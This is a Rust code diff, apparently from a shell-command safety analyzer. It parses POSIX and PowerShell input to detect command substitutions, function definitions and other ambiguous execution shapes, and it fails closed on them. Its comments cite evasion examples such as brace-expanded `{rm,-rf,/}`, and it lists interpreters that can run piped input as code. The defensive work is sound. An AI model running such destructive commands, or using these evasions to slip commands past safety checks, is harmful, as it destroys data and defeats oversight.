+                && !matches!(
+                    option.as_str(),
+                    "--noprofile" | "--norc" | "--posix" | "--restricted" | "--verbose" | "--login"
+                )
+            {
+                return true;
+            }
+            index += 1;
+        }
+        let Some(script) = args.get(index) else {
+            return true;
+        };
+        return force_stdin
+            || static_wrapper_word(script, ShellType::Posix)
+                .is_none_or(|script| posix_stdin_code_path(&script));
+    }
+
+    if let Some(mode) = posix_non_shell_interpreter_input_mode(command, args) {
+        return match mode {
+            PosixInterpreterInputMode::StdinProgram | PosixInterpreterInputMode::Ambiguous => true,
+            PosixInterpreterInputMode::FixedProgram => false,
+            PosixInterpreterInputMode::InlineProgram(body) => {
+                posix_inline_program_may_execute_stdin(command, &body)
+            }
+        };
+    }
+
+    matches!(command, "pwsh" | "powershell" | "xargs")
+        || (is_interpreter(command)
+            && !matches!(
+                command,
+                "sh" | "bash" | "zsh" | "dash" | "ksh" | "csh" | "tcsh" | "ash" | "mksh" | "fish"
+            ))
+}
+
+fn posix_function_invocation_needs_context(
+    raw: &str,
+    offset: usize,
+    body: &str,
+    segments: &[tokenize::Segment],
+) -> bool {
+    let Some(index) = segments
+        .iter()
+        .position(|segment| segment.byte_range.start <= offset && offset < segment.byte_range.end)
+    else {
+        return true;
+    };
+    let incoming_pipeline = matches!(
+        segments[index].preceding_separator.as_deref(),
+        Some("|" | "|&")
+    );
+    if incoming_pipeline {
+        let mut remaining_bodies = MAX_POSIX_DISPATCH_JOIN_BODIES;
+        if posix_body_accepts_pipeline_as_code(body, 0, &mut remaining_bodies) {
+            return true;
+        }
+    }
+
+    if !matches!(
+        posix_segment_outgoing_separator(raw, segments, index),
+        Some("|" | "|&")
+    ) {
+        return false;
+    }
+    let mut downstream = index + 1;
+    while let Some(segment) = segments.get(downstream) {
+        let Some((command, args)) = resolve_wrapped_command_for_shell(segment, ShellType::Posix)
+        else {
+            return true;
+        };
+        let command = crate::rules::command::normalize_cmd_base(&command, ShellType::Posix);
+        let mut remaining_bodies = MAX_POSIX_DISPATCH_JOIN_BODIES;
+        if posix_command_accepts_pipeline_as_code(&command, &args, 0, &mut remaining_bodies) {
+            return true;
+        }
+        if !matches!(
+            posix_segment_outgoing_separator(raw, segments, downstream),
+            Some("|" | "|&")
+        ) {
+            break;
+        }
+        downstream += 1;
+    }
+    false
+}
+
+fn apply_posix_function_state_command(
+    segment: &tokenize::Segment,
+    state: &mut std::collections::HashMap<String, PosixFunctionBinding>,
+    mutation_is_uncertain: bool,
+) -> Result<bool, ()> {
+    let Some(invocation) = posix_current_shell_builtin_invocation(segment)? else {
+        return Ok(false);
+    };
+    if invocation
+        .lookup_wrappers
+        .iter()
+        .any(|wrapper| state.contains_key(wrapper))
+    {
+        return Err(());
+    }
+    let command = invocation.command;
+    let args = invocation.args;
+    if !matches!(command.as_str(), "readonly" | "unset") {
+        return Ok(false);
+    }
+    if !invocation.bypasses_function_lookup && state.contains_key(&command) {
+        return Ok(false);
+    }
+
+    let mut function_mode = false;
+    let mut operands = Vec::new();
+    let mut options = true;
+    for raw in args {
+        let word = static_wrapper_word(&raw, ShellType::Posix).ok_or(())?;
+        if options && word == "--" {
+            options = false;
+            continue;
+        }
+        if options && word.starts_with('-') && word != "-" {
+            let flags = word.trim_start_matches('-');
+            let valid = if command == "readonly" {
+                flags
+                    .chars()
+                    .all(|flag| matches!(flag, 'a' | 'A' | 'f' | 'p'))
+            } else {
+                flags.chars().all(|flag| matches!(flag, 'f' | 'v' | 'n'))
+            };
+            if flags.is_empty() || !valid {
+                return Err(());
+            }
+            function_mode |= flags.contains('f');
+            continue;
+        }
+        options = false;
+        operands.push(word);
+    }
+    if command == "readonly" && !function_mode {
+        return Ok(false);
+    }
+    if command == "unset" && !function_mode {
+        // Plain `unset name` selects a same-named variable before a function;
+        // ambient variable state is outside this source buffer.
+        return Err(());
+    }
+    if operands.is_empty() {
+        return Ok(false);
+    }
+    if mutation_is_uncertain {
+        return Err(());
+    }
+    for name in operands {
+        if !is_literal_bash_function_name(&name, true) {
+            return Err(());
+        }
+        if command == "readonly" {
+            if let Some(binding) = state.get_mut(&name) {
+                binding.readonly = true;
+            }
+        } else if !state.get(&name).is_some_and(|binding| binding.readonly) {
+            state.remove(&name);
+        }
+    }
+    Ok(true)
+}
+
+#[derive(Debug)]
+struct PosixCurrentShellBuiltinInvocation {
+    command: String,
+    args: Vec<String>,
+    bypasses_function_lookup: bool,
+    lookup_wrappers: Vec<String>,
+}
+
+fn posix_current_shell_builtin_from_words(
+    command_raw: &str,
+    args: &[String],
+    depth: usize,
+) -> Result<Option<PosixCurrentShellBuiltinInvocation>, ()> {
+    if depth > 4 {
+        return Err(());
+    }
+    let Some(command) = static_wrapper_word(command_raw, ShellType::Posix) else {
+        return Ok(None);
+    };
+    if !matches!(command.as_str(), "builtin" | "command") {
+        return Ok(Some(PosixCurrentShellBuiltinInvocation {
+            command,
+            args: args.to_vec(),
+            bypasses_function_lookup: depth > 0,
+            lookup_wrappers: Vec::new(),
+        }));
+    }
+
+    let mut index = 0usize;
+    while index < args.len() {
+        let word = static_wrapper_word(&args[index], ShellType::Posix).ok_or(())?;
+        if word == "--" {
+            index += 1;
+            break;
+        }
+        if !word.starts_with('-') || word == "-" {
+            break;
+        }
+        if command == "builtin" {
+            return Err(());
+        }
+        let flags = word.trim_start_matches('-');
+        if flags.is_empty() || !flags.chars().all(|flag| matches!(flag, 'p' | 'v' | 'V')) {
+            return Err(());
+        }
+        if flags.chars().any(|flag| matches!(flag, 'v' | 'V')) {
+            // `command -v/-V` performs lookup only; it never invokes the
+            // named builtin in the current shell.
+            return Ok(None);
+        }
+        index += 1;
+    }
+    let Some(target) = args.get(index) else {
+        return Ok(None);
+    };
+    let mut invocation =
+        posix_current_shell_builtin_from_words(target, &args[index + 1..], depth + 1)?;
+    if let Some(invocation) = invocation.as_mut() {
+        invocation.lookup_wrappers.push(command);
+    }
+    Ok(invocation)
+}
+
+/// Resolve only spellings that can mutate the current Bash process. Generic
+/// executable-wrapper resolution is intentionally too broad here: `env`,
+/// `nohup`, `sudo`, and external `time` run a child and cannot change the
+/// caller's function/builtin tables.
+fn posix_current_shell_builtin_invocation(
+    segment: &tokenize::Segment,
+) -> Result<Option<PosixCurrentShellBuiltinInvocation>, ()> {
+    let Some(command_raw) = segment.command.as_deref() else {
+        return Ok(None);
+    };
+    let Some(command) = static_wrapper_word(command_raw, ShellType::Posix) else {
+        return Ok(None);
+    };
+
+    if command == "time" && posix_segment_uses_reserved_time(segment) {
+        let mut index = 0usize;
+        if segment
+            .args
+            .get(index)
+            .is_some_and(|word| is_strict_posix_reserved_word(word, "-p"))
+        {
+            index += 1;
+        }
+        if segment
+            .args
+            .get(index)
+            .is_some_and(|word| is_strict_posix_reserved_word(word, "--"))
+        {
+            index += 1;
+        }
+        let Some(target) = segment.args.get(index) else {
+            return Ok(None);
+        };
+        return posix_current_shell_builtin_from_words(target, &segment.args[index + 1..], 0);
+    }
+
+    posix_current_shell_builtin_from_words(command_raw, &segment.args, 0)
+}
+
+fn posix_reserved_time_word_at(
+    raw_word: &str,
+    offset: usize,
+    segments: Option<&[tokenize::Segment]>,
+) -> bool {
+    is_strict_posix_reserved_word(raw_word, "time")
+        && segments.is_some_and(|segments| {
+            segments
+                .iter()
+                .find(|segment| {
+                    segment.byte_range.start <= offset && offset < segment.byte_range.end
+                })
+                .is_some_and(posix_segment_uses_reserved_time)
+        })
+}
+
+fn lexical_executable_substitutions(
+    raw: &str,
+    shell: ShellType,
+) -> (Vec<String>, Option<ShellExecutionGap>) {
+    let bytes = raw.as_bytes();
+    let mut bodies = Vec::new();
+    let mut functions = std::collections::HashMap::<String, PosixFunctionBinding>::new();
+    let mut function_body_indices = std::collections::HashSet::new();
+    let mut invoked_function_needs_context = false;
+    let mut quote = ShellLexQuote::Normal;
+    let mut command_start = true;
+    let mut word_start = true;
+    let mut assignment_word = false;
+    let mut incomplete = false;
+    let mut gap = None;
+    let mut i = 0usize;
+    let posix_segments = (shell == ShellType::Posix).then(|| tokenize::tokenize(raw, shell));
+    let uncertain_posix_mutations = posix_segments
+        .as_deref()
+        .map(|segments| uncertain_posix_state_mutation_segments(raw, segments));
+    let mut next_state_segment = 0usize;
+
+    while i < bytes.len() {
+        if shell == ShellType::Posix {
+            if let (Some(segments), Some(uncertain)) = (
+                posix_segments.as_deref(),
+                uncertain_posix_mutations.as_deref(),
+            ) {
+                while segments
+                    .get(next_state_segment)
+                    .is_some_and(|segment| segment.byte_range.start <= i)
+                {
+                    let segment = &segments[next_state_segment];
+                    if apply_posix_function_state_command(
+                        segment,
+                        &mut functions,
+                        uncertain.get(next_state_segment).copied().unwrap_or(true),
+                    )
+                    .is_err()
+                    {
+                        gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+                    }
+                    if let Some(command) = posix_function_command_word(segment) {
+                        if let Some(binding) = functions.get(&command) {
+                            let body_index = bodies.len();
+                            bodies.push(binding.definition.body.clone());
+                            function_body_indices.insert(body_index);
+                            invoked_function_needs_context |=
+                                posix_function_invocation_needs_context(
+                                    raw,
+                                    segment.byte_range.start,
+                                    &binding.definition.body,
+                                    segments,
+                                );
+                        }
+                    }
+                    next_state_segment += 1;
+                }
+            }
+        }
+        let byte = bytes[i];
+        match quote {
+            ShellLexQuote::Single => {
+                if byte == b'\'' {
+                    if shell == ShellType::PowerShell && bytes.get(i + 1) == Some(&b'\'') {
+                        i += 2;
+                        continue;
+                    }
+                    quote = ShellLexQuote::Normal;
+                }
+                i += 1;
+                continue;
+            }
+            ShellLexQuote::Double => {
+                if byte == shell_escape_byte(shell) && i + 1 < bytes.len() {
+                    i += 2;
+                    continue;
+                }
+                if byte == b'"' {
+                    quote = ShellLexQuote::Normal;
+                    i += 1;
+                    continue;
+                }
+                if shell != ShellType::Cmd && byte == b'$' && bytes.get(i + 1) == Some(&b'(') {
+                    let open = i + 1;
+                    let Some(next) = capture_shell_body(raw, open, shell, &mut bodies) else {
+                        incomplete = true;
+                        break;
+                    };
+                    i = next;
+                    word_start = false;
+                    if !assignment_word {
+                        command_start = false;
+                    }
+                    continue;
+                }
+                if shell == ShellType::Posix && byte == b'`' {
+                    let Some(close) = find_backtick_close(raw, i) else {
+                        if let Some(suffix) = raw.get(i + 1..) {
+                            if !suffix.trim().is_empty() {
+                                bodies.push(suffix.to_string());
+                            }
+                        }
+                        incomplete = true;
+                        break;
+                    };
+                    if let Some(body) = raw.get(i + 1..close) {
+                        bodies.push(body.to_string());
+                    }
+                    i = close + 1;
+                    word_start = false;
+                    if !assignment_word {
+                        command_start = false;
+                    }
+                    continue;
+                }
+                i += 1;
+                continue;
+            }
+            ShellLexQuote::Normal => {}
+        }
+
+        if starts_shell_line_comment(bytes, i, shell, word_start) {
+            while i < bytes.len() && bytes[i] != b'\n' {
+                i += 1;
+            }
+            if i < bytes.len() {
+                i += 1;
+                command_start = true;
+                word_start = true;
+                assignment_word = false;
+            }
+            continue;
+        }
+        if shell == ShellType::Posix && byte == b'<' && bytes.get(i + 1) == Some(&b'<') {
+            // Heredoc/here-string payloads have their own delimiter and quote
+            // grammar. Until that grammar is represented in the command IR,
+            // fail closed instead of allowing quote-looking payload data to
+            // hide a command following the terminator.
+            gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+        }
+        if shell == ShellType::Posix
+            && command_start
+            && word_start
+            && matches!(byte, b'\'' | b'"' | b'\\')
+        {
+            // Bash permits a literal function name to be quoted or escaped at
+            // invocation time (for example `'-sink'`). Resolve the complete
+            // static word before the ordinary quote branches consume it and
+            // lose its command-position identity.
+            if let Some((word, end)) = parse_static_posix_shell_word(raw, i) {
+                if shell_word_boundary(bytes.get(end)) {
+                    let raw_word = raw.get(i..end).unwrap_or_default();
+                    let command_prefix = posix_command_prefix(raw_word, &word);
+                    let reserved_time =
+                        posix_reserved_time_word_at(raw_word, i, posix_segments.as_deref());
+                    if !command_prefix && !reserved_time {
+                        if let Some(binding) = functions.get(&word) {
+                            let definition = &binding.definition;
+                            let body_index = bodies.len();
+                            bodies.push(definition.body.clone());
+                            function_body_indices.insert(body_index);
+                            invoked_function_needs_context |=
+                                posix_segments.as_deref().is_none_or(|segments| {
+                                    posix_function_invocation_needs_context(
+                                        raw,
+                                        i,
+                                        &definition.body,
+                                        segments,
+                                    )
+                                });
+                        }
+                    }
+                    command_start = command_prefix || reserved_time;
+                    word_start = false;
+                    assignment_word = false;
+                    i = end;
+                    continue;
+                }
+            }
+        }
+        if byte == shell_escape_byte(shell) && i + 1 < bytes.len() {
+            if shell == ShellType::Posix && bytes.get(i + 1) == Some(&b'\n') {
+                // POSIX removes line continuations before token/comment
+                // recognition. They do not begin a new logical word.
+                i += 2;
+                continue;
+            }
+            if word_start && command_start && !assignment_word {
+                command_start = false;
+            }
+            word_start = false;
+            i += 2;
+            continue;
+        }
+        if byte == b'\'' && shell != ShellType::Cmd {
+            if word_start && command_start && !assignment_word {
+                command_start = false;
+            }
+            word_start = false;
+            quote = ShellLexQuote::Single;
+            i += 1;
+            continue;
+        }
+        if byte == b'"' {
+            if word_start && command_start && !assignment_word {
+                command_start = false;
+            }
+            word_start = false;
+            quote = ShellLexQuote::Double;
+            i += 1;
+            continue;
+        }
+
+        if shell == ShellType::Posix && command_start && word_start {
+            match parse_posix_function_definition(raw, i) {
+                PosixFunctionParse::Complete { definition, end } => {
+                    let mutation_is_uncertain = posix_segments
+                        .as_deref()
+                        .zip(uncertain_posix_mutations.as_deref())
+                        .is_none_or(|(segments, uncertain)| {
+                            posix_state_mutation_at_is_uncertain(i, segments, uncertain)
+                        });
+                    if mutation_is_uncertain {
+                        gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+                    } else if !functions
+                        .get(&definition.name)
+                        .is_some_and(|binding| binding.readonly)
+                    {
+                        functions.insert(
+                            definition.name.clone(),
+                            PosixFunctionBinding {
+                                definition,
+                                readonly: false,
+                            },
+                        );
+                    }
+                    i = end;
+                    command_start = false;
+                    word_start = false;
+                    assignment_word = false;
+                    continue;
+                }
+                PosixFunctionParse::Incomplete { body_start } => {
+                    if let Some(suffix) = raw.get(body_start..) {
+                        if !suffix.trim().is_empty() {
+                            bodies.push(suffix.to_string());
+                        }
+                    }
+                    incomplete = true;
+                    break;
+                }
+                PosixFunctionParse::NotDefinition => {}
+            }
+        }
+
+        if matches!(shell, ShellType::Posix | ShellType::Fish)
+            && command_start
+            && word_start
+            && byte == b'$'
+        {
+            // Parameter expansion and command substitution can synthesize the
+            // command leader itself (`$cmd ...`, `${x:-rm} ...`, `$(...) ...`).
+            // The producer body is still recovered below, but its output is
+            // not a statically known executable identity.
+            gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+        }
+
+        if shell != ShellType::Cmd && byte == b'$' && bytes.get(i + 1) == Some(&b'(') {
+            let open = i + 1;
+            let Some(next) = capture_shell_body(raw, open, shell, &mut bodies) else {
+                incomplete = true;
+                break;
+            };
+            i = next;
+            word_start = false;
+            if !assignment_word {
+                command_start = false;
+            }
+            continue;
+        }
+
+        if matches!(shell, ShellType::Posix | ShellType::Fish)
+            && matches!(byte, b'<' | b'>')
+            && bytes.get(i + 1) == Some(&b'(')
+        {
+            let open = i + 1;
+            let Some(next) = capture_shell_body(raw, open, shell, &mut bodies) else {
+                incomplete = true;
+                break;
+            };
+            i = next;
+            word_start = false;
+            continue;
+        }
+
+        if byte == b'('
+            && ((shell == ShellType::Fish)
+                || (shell == ShellType::Posix && command_start && word_start))
+        {
+            let recovered_start = bodies.len();
+            let Some(next) = capture_shell_body(raw, i, shell, &mut bodies) else {
+                incomplete = true;
+                break;
+            };
+            if shell == ShellType::Posix
+                && bodies
+                    .get(recovered_start..)
+                    .is_none_or(|recovered| recovered.iter().all(|body| body.trim().is_empty()))
+            {
+                // An empty command-position `()` is not a valid subshell and
+                // often indicates a malformed or split function header. Keep
+                // the unsupported execution shape fail-closed.
+                gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+            }
+            i = next;
+            command_start = false;
+            word_start = false;
+            continue;
+        }
+
+        if shell == ShellType::Cmd && byte == b'(' {
+            let Some(next) = capture_shell_body(raw, i, shell, &mut bodies) else {
+                incomplete = true;
+                break;
+            };
+            i = next;
+            command_start = false;
+            word_start = false;
+            continue;
+        }
+
+        if shell == ShellType::Posix
+            && byte == b'{'
+            && command_start
+            && word_start
+            && bytes
+                .get(i + 1)
+                .is_some_and(|next| next.is_ascii_whitespace())
+        {
+            let body_start = i + 1;
+            let Some(next) = capture_shell_body(raw, i, shell, &mut bodies) else {
+                incomplete = true;
+                break;
+            };
+            if raw
+                .get(body_start..next.saturating_sub(1))
+                .is_some_and(contains_literal_posix_dispatch_mutation)
+            {
+                gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+            }
+            i = next;
+            command_start = false;
+            word_start = false;
+            continue;
+        }
+
+        if matches!(shell, ShellType::Posix | ShellType::Fish)
+            && byte == b'{'
+            && command_start
+            && word_start
+        {
+            // Brace expansion can synthesize the command and its argv as one
+            // lexical word (`{rm,-rf,/}`). It is not a brace command group.
+            gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+        }
+
+        if shell == ShellType::Posix && byte == b'`' {
+            if command_start && word_start {
+                gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+            }
+            let Some(close) = find_backtick_close(raw, i) else {
+                if let Some(suffix) = raw.get(i + 1..) {
+                    if !suffix.trim().is_empty() {
+                        bodies.push(suffix.to_string());
+                    }
+                }
+                incomplete = true;
+                break;
+            };
+            if let Some(body) = raw.get(i + 1..close) {
+                bodies.push(body.to_string());
+            }
+            i = close + 1;
+            word_start = false;
+            if !assignment_word {
+                command_start = false;
+            }
+            continue;
+        }
+
+        let syntax_whitespace = if shell == ShellType::Posix {
+            matches!(byte, b' ' | b'\t' | b'\n')
+        } else {
+            byte.is_ascii_whitespace()
+        };
+        if syntax_whitespace {
+            if byte == b'\n' {
+                command_start = true;
+            }
+            word_start = true;
+            assignment_word = false;
+            i += 1;
+            continue;
+        }
+        if matches!(byte, b';' | b'|')
+            || (byte == b'&'
+                && !matches!(bytes.get(i.wrapping_sub(1)).copied(), Some(b'>' | b'<'))
+                && bytes.get(i + 1) != Some(&b'>'))
+        {
+            command_start = true;
+            word_start = true;
+            assignment_word = false;
+            i += if bytes.get(i + 1) == Some(&byte) {
+                2
+            } else {
+                1
+            };
+            continue;
+        }
+
+        if word_start {
+            if command_start && shell == ShellType::Posix {
+                if posix_assignment_word_at(raw, i) {
+                    assignment_word = true;
+                } else if let Some((word, end)) = parse_static_posix_shell_word(raw, i) {
+                    if shell_word_boundary(bytes.get(end)) {
+                        let raw_word = raw.get(i..end).unwrap_or_default();
+                        let command_prefix = posix_command_prefix(raw_word, &word);
+                        let reserved_time =
+                            posix_reserved_time_word_at(raw_word, i, posix_segments.as_deref());
+                        if !command_prefix && !reserved_time {
+                            if let Some(binding) = functions.get(&word) {
+                                let definition = &binding.definition;
+                                let body_index = bodies.len();
+                                bodies.push(definition.body.clone());
+                                function_body_indices.insert(body_index);
+                                invoked_function_needs_context |=
+                                    posix_segments.as_deref().is_none_or(|segments| {
+                                        posix_function_invocation_needs_context(
+                                            raw,
+                                            i,
+                                            &definition.body,
+                                            segments,
+                                        )
+                                    });
+                            }
+                        }
+                        command_start = command_prefix || reserved_time;
+                    } else {
+                        command_start = false;
+                    }
+                } else if !matches!(byte, b'<' | b'>') {
+                    command_start = false;
+                }
+            } else if command_start && !assignment_word && !matches!(byte, b'<' | b'>') {
+                command_start = false;
+            }
+            word_start = false;
+        }
+        i += 1;
+    }
+    if quote != ShellLexQuote::Normal {
+        incomplete = true;
+    }
+    if shell == ShellType::Posix {
+        let function_names = functions
+            .keys()
+            .cloned()
+            .collect::<std::collections::HashSet<_>>();
+        let mut remaining_bodies = MAX_POSIX_DISPATCH_JOIN_BODIES;
+        if invoked_function_needs_context
+            || bodies.iter().any(|body| {
+                posix_body_calls_parent_function(body, &function_names, 0, &mut remaining_bodies)
+            })
+            || function_body_indices.iter().any(|index| {
+                bodies
+                    .get(*index)
+                    .is_some_and(|body| contains_literal_posix_dispatch_mutation(body))
+            })
+        {
+            gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+        }
+    }
+    (
+        bodies,
+        if incomplete {
+            Some(ShellExecutionGap::IncompleteExecutableBody)
+        } else {
+            gap
+        },
+    )
+}
+
+fn record_shell_execution_gap(scan: &mut ExecutableSubstitutionScan, gap: ShellExecutionGap) {
+    if scan.gap.is_none() {
+        scan.gap = Some(gap);
+    }
+}
+
+fn powershell_block_comment_end_bytes(raw: &str, start: usize) -> Option<usize> {
+    let bytes = raw.as_bytes();
+    if bytes.get(start..start + 2) != Some(b"<#") {
+        return None;
+    }
+    let mut index = start + 2;
+    while index + 1 < bytes.len() {
+        if bytes.get(index..index + 2) == Some(b"#>") {
+            return Some(index + 2);
+        }
+        index += 1;
+    }
+    None
+}
+
+fn complete_brace_body(raw: &str) -> Option<&str> {
+    let trimmed = raw.trim();
+    if !trimmed.starts_with('{') {
+        return None;
+    }
+    let close = find_shell_delimiter_close(trimmed, 0, ShellType::PowerShell)?;
+    if !trimmed.get(close + 1..)?.trim().is_empty() {
+        return None;
+    }
+    trimmed.get(1..close)
+}
+
+#[derive(Clone)]
+struct PowerShellFunctionDefinition {
+    name: String,
+    body: String,
+    explicit_parent_scope: bool,
+}
+
+enum PowerShellFunctionParse {
+    NotDefinition,
+    Complete(PowerShellFunctionDefinition),
+    Incomplete,
+}
+
+fn skip_powershell_whitespace(raw: &str, mut index: usize) -> usize {
+    while let Some(ch) = raw.get(index..).and_then(|suffix| suffix.chars().next()) {
+        if !ch.is_whitespace() {
+            break;
+        }
+        index += ch.len_utf8();
+    }
+    index
+}
+
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum PowerShellFunctionQuote {
+    Single,
+    Double,
+}
+
+fn powershell_function_quote(ch: char) -> Option<PowerShellFunctionQuote> {
+    match ch {
+        '\'' | '\u{2018}' | '\u{2019}' | '\u{201a}' | '\u{201b}' => {
+            Some(PowerShellFunctionQuote::Single)
+        }
+        '"' | '\u{201c}' | '\u{201d}' | '\u{201e}' => Some(PowerShellFunctionQuote::Double),
+        _ => None,
+    }
+}
+
+fn powershell_function_name_end(raw: &str, start: usize) -> Option<usize> {
+    let mut index = start;
+    let mut quote = None;
+    while let Some(ch) = raw.get(index..).and_then(|suffix| suffix.chars().next()) {
+        if let Some(delimiter) = quote {
+            index += ch.len_utf8();
+            if powershell_function_quote(ch) == Some(delimiter) {
+                if raw
+                    .get(index..)
+                    .and_then(|suffix| suffix.chars().next())
+                    .and_then(powershell_function_quote)
+                    == Some(delimiter)
+                {
+                    index += raw
+                        .get(index..)
+                        .and_then(|suffix| suffix.chars().next())?
+                        .len_utf8();
+                } else {
+                    quote = None;
+                }
+            } else if delimiter == PowerShellFunctionQuote::Double && ch == '`' {
+                let escaped = raw.get(index..)?.chars().next()?;
+                index += escaped.len_utf8();
+            }
+            continue;
+        }
+        if ch.is_whitespace() || matches!(ch, '{' | '(' | ')' | ';' | '|') {
+            break;
+        }
+        if let Some(delimiter) = powershell_function_quote(ch) {
+            quote = Some(delimiter);
+        } else if ch == '`' {
+            index += ch.len_utf8();
+            let escaped = raw.get(index..)?.chars().next()?;
+            index += escaped.len_utf8();
+            continue;
+        }
+        index += ch.len_utf8();
+    }
+    (index != start && quote.is_none()).then_some(index)
+}
+
+fn powershell_alias_definition(args: &[String]) -> Option<(String, Option<String>)> {
+    let literal = |raw: &str| static_wrapper_word(raw, ShellType::PowerShell);
+    let mut name = None;
+    let mut value = None;
+    let mut positional = Vec::new();
+    let mut index = 0usize;
+    while index < args.len() {
+        let normalized = crate::rules::command::normalize_powershell_parameter_token(
+            &args[index],
+            ShellType::PowerShell,
+        );
+        let lower = normalized.to_ascii_lowercase();
+        let delimiter = lower
+            .char_indices()
+            .find_map(|(offset, ch)| matches!(ch, ':' | '=').then_some(offset));
+        let (option, attached) = delimiter.map_or((lower.as_str(), None), |offset| {
+            (&lower[..offset], Some(&lower[offset + 1..]))
+        });
+        if option == "-name" || option == "-value" {
+            let parsed = if let Some(attached) = attached {
+                (!attached.is_empty()).then_some(attached.to_string())
+            } else {
+                let parsed = args.get(index + 1).and_then(|arg| literal(arg));
+                index += 1;
+                parsed
+            };
+            if option == "-name" {
+                name = parsed;
+            } else {
+                value = parsed;
+            }
+            index += 1;
+            continue;
+        }
+        if matches!(option, "-description" | "-option" | "-scope") {
+            if attached.is_none() {
+                index = index.saturating_add(2);
+            } else {
+                index += 1;
+            }
+            continue;
+        }
+        if lower.starts_with('-') {
+            index += 1;
+            continue;
+        }
+        positional.push(args[index].clone());
+        index += 1;
+    }
+    if name.is_none() {
+        name = positional.first().and_then(|arg| literal(arg));
+    }
+    if value.is_none() {
+        value = positional.get(1).and_then(|arg| literal(arg));
+    }
+    let name = name?.to_ascii_lowercase();
+    Some((name, value))
+}
+
+fn parse_powershell_function_definition(raw: &str) -> PowerShellFunctionParse {
+    let bytes = raw.as_bytes();
+    let mut index = skip_powershell_whitespace(raw, 0);
+    let start = index;
+    while bytes.get(index).is_some_and(u8::is_ascii_alphabetic) {
+        index += 1;
+    }
+    let Some(keyword) = raw.get(start..index) else {
+        return PowerShellFunctionParse::NotDefinition;
+    };
+    if !keyword.eq_ignore_ascii_case("function") && !keyword.eq_ignore_ascii_case("filter") {
+        return PowerShellFunctionParse::NotDefinition;
+    }
+    if !raw
+        .get(index..)
+        .and_then(|suffix| suffix.chars().next())
+        .is_some_and(char::is_whitespace)
+    {
+        return PowerShellFunctionParse::NotDefinition;
+    }
+    index = skip_powershell_whitespace(raw, index);
+    let name_start = index;
+    let Some(name_end) = powershell_function_name_end(raw, index) else {
+        return PowerShellFunctionParse::Incomplete;
+    };
+    let Some(name_spelling) = raw.get(name_start..name_end) else {
+        return PowerShellFunctionParse::Incomplete;
+    };
+    if !crate::rules::command::command_word_is_statically_bound(
+        name_spelling,
+        ShellType::PowerShell,
+    ) {
+        return PowerShellFunctionParse::Incomplete;
+    }
+    let name = crate::rules::command::normalize_shell_token(name_spelling, ShellType::PowerShell);
+    if name.is_empty() {
+        return PowerShellFunctionParse::Incomplete;
+    }
+    index = skip_powershell_whitespace(raw, name_end);
+    if bytes.get(index) == Some(&b'(') {
+        let Some(close) = find_shell_delimiter_close(raw, index, ShellType::PowerShell) else {
+            return PowerShellFunctionParse::Incomplete;
+        };
+        index = skip_powershell_whitespace(raw, close + 1);
+    }
+    if bytes.get(index) != Some(&b'{') {
+        return PowerShellFunctionParse::Incomplete;
+    }
+    let Some(close) = find_shell_delimiter_close(raw, index, ShellType::PowerShell) else {
+        return PowerShellFunctionParse::Incomplete;
+    };
+    let Some(body) = raw.get(index + 1..close) else {
+        return PowerShellFunctionParse::Incomplete;
+    };
+    if !raw
+        .get(close + 1..)
+        .is_some_and(|suffix| suffix.trim().is_empty())
+    {
+        return PowerShellFunctionParse::Incomplete;
+    }
+    let lower_name = name.to_ascii_lowercase();
+    let name_parts = lower_name.split(':').collect::<Vec<_>>();
+    let explicit_parent_scope = name_parts
+        .iter()
+        .take(name_parts.len().saturating_sub(1))
+        .any(|part| matches!(*part, "global" | "script"));
+    PowerShellFunctionParse::Complete(PowerShellFunctionDefinition {
+        name: name_parts.last().copied().unwrap_or(&name).to_string(),
+        body: body.to_string(),
+        explicit_parent_scope,
+    })
+}
+
+fn powershell_named_function_block_keyword(raw: &str) -> bool {
+    matches!(
+        raw.trim().to_ascii_lowercase().as_str(),
+        "dynamicparam" | "begin" | "process" | "end" | "clean"
+    )
+}
+
+fn powershell_named_function_block_body(raw: &str) -> Option<&str> {
+    let bytes = raw.as_bytes();
+    let mut index = skip_powershell_whitespace(raw, 0);
+    let keyword_start = index;
+    while bytes.get(index).is_some_and(u8::is_ascii_alphabetic) {
+        index += 1;
+    }
+    if !powershell_named_function_block_keyword(raw.get(keyword_start..index)?) {
+        return None;
+    }
+    if !raw
+        .get(index..)
+        .and_then(|suffix| suffix.chars().next())
+        .is_some_and(|ch| ch.is_whitespace() || ch == '{')
+    {
+        return None;
+    }
+    index = skip_powershell_whitespace(raw, index);
+    if bytes.get(index) != Some(&b'{') {
+        return None;
+    }
+    let close = find_shell_delimiter_close(raw, index, ShellType::PowerShell)?;
+    if !raw.get(close + 1..)?.trim().is_empty() {
+        return None;
+    }
+    raw.get(index + 1..close)
+}
+
+fn push_powershell_named_function_blocks(raw: &str, scan: &mut ExecutableSubstitutionScan) {
+    let mut pending_keyword = false;
+    for segment in tokenize::tokenize(raw, ShellType::PowerShell) {
+        let body = powershell_named_function_block_body(&segment.raw).or_else(|| {
+            (pending_keyword && segment.preceding_separator.as_deref() == Some("\n"))
+                .then(|| complete_brace_body(&segment.raw))
+                .flatten()
+        });
+        if let Some(body) = body {
+            scan.bodies.push(ExecutableBody {
+                input: body.to_string(),
+                shell: ShellType::PowerShell,
+            });
+            pending_keyword = false;
+            continue;
+        }
+        pending_keyword = powershell_named_function_block_keyword(&segment.raw);
+    }
+}
+
+fn powershell_scriptblock_method_end(raw: &str, after_value: usize) -> Option<usize> {
+    let bytes = raw.as_bytes();
+    let method_start = skip_powershell_whitespace(raw, after_value);
+    let rest = raw.get(method_start..)?;
+    let lower = rest.to_ascii_lowercase();
+    let method_len = if lower.starts_with(".invokewithcontext") {
+        ".invokewithcontext".len()
+    } else if lower.starts_with(".invokereturnasis") {
+        ".invokereturnasis".len()
+    } else if lower.starts_with(".invoke") {
+        ".invoke".len()
+    } else {
+        return None;
+    };
+    let open = skip_powershell_whitespace(raw, method_start + method_len);
+    if bytes.get(open) != Some(&b'(') {
+        return None;
+    }
